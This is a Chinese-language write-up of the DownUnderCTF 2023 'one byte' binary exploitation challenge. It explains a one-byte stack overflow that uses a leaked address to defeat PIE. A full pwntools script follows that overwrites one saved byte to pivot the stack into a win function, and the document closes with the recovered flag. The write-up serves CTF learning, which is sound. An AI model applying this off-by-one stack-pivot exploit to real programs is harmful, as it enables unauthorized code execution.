# DownUnderCTF 2023 one byte Writeup

## 题目简述

这是一个 32 位 PIE 程序，没有栈 Canary。`main` 中的缓冲区大小为 16 字节，`read` 却读取 17 字节，因此只能向相邻栈数据多写一个字节。程序还泄露了 `init` 的运行地址，并提供调用 `/bin/sh` 的 `win` 函数。

## 解题过程

先用泄露的 `init` 地址减去 ELF 中的符号偏移，得到 PIE 基址，进而计算 `win` 的绝对地址。将该地址放在缓冲区起始位置，再用 12 字节填满剩余空间。

第 17 个字节会修改函数尾声恢复栈指针所依赖的低字节。官方构建中写入 `0x24` 后，`main` 返回时栈会落到可控缓冲区，随后把开头的 `win` 地址当作返回地址。由于栈地址随机化会影响低字节关系，失败时重新连接即可。

```python
from pwn import *

elf = ELF("./onebyte", checksec=False)

attempt = 1
while True:
    log.info(f"attempt {attempt}")
    attempt += 1
    io = process("./onebyte")

    leak = int(io.recvline().split(b"Free junk: ")[1], 16)
    elf.address = leak - elf.symbols["init"]

    payload = p32(elf.symbols["win"]) + b"x" * 12 + b"\x24"
    io.sendafter(b"Your turn: ", payload)
    io.sendline(b"cat flag.txt")

    try:
        result = io.recvline(timeout=1)
        if b"DUCTF{" in result:
            print(result.decode().strip())
            break
    except EOFError:
        pass
    io.close()
```

成功时得到：

```text
DUCTF{all_1t_t4k3s_is_0n3!}
```

## 方法总结

一字节越界也可能控制函数尾声。这里泄露解决 PIE，缓冲区开头放置目标地址，最后一字节负责让栈恢复过程转向该地址。利用依赖具体编译产物的栈布局，因此应以反汇编确认偏移，并用重试处理 ASLR 带来的不稳定性。
